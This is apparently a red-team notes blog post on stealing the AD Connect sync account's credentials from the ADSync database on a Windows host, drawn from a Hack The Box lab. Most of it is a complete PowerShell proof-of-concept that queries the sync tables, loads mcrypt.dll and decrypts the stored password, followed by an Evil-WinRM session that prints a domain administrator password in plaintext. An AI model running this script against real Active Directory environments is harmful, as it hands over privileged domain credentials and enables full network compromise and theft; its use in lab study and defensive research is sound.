---
layout: post
title: Extracting creds from AD Connect
description: Extracting creds from AD Connect
summary: Extracting creds from AD Connect
tags: [privesc,windows,azure]
minute: 1
---
## Overview
Attacker can extract admin credentials from ADSync databases that is used for syncing credential hashes from onpremis AD to Azure AD.

## Enviroment Setup and Requirements
* AD sync must be running on victim machine using "Password Hash Synchronisation (PHS)"
* Low privileged user must have permission on `ADSync` DB
* Attacker must have gained access to that low privileged account via winrm

## Steps
* Login to victim via winrm
* Check if AD Sync is running

```powershell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

* Verify access to ADSync DB

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd /S localhost /d ADSync /q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
*Evil-WinRM* PS C:\Users\mhope\Documents> 
```

* Run this powershell script. This will get the encrypted string from `mms_management_agent` table and decrypt it using `mcrypt.dll`.

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$sqlserver = "localhost"
$dbname = "ADSync"

$client = New-Object System.Data.SqlClient.SqlConnection
$client.ConnectionString = "Server = $sqlserver; Database = $dbname; Integrated Security = True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

* Run the script

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> .\decrypt.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

## Gotchas
Older versions of AD Connect uses registry but newer ones uses DPAPI. Take this into consideration when using tools to extract the credentials.

To see the version, use this command.

```powershell
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```

## References
* HTB Mo teverde
* [Azure AD Connect for Red Teamers - XPN InfoSec Blog](https://blog.xpnsec.com/azuread-connect-for-redteam/)
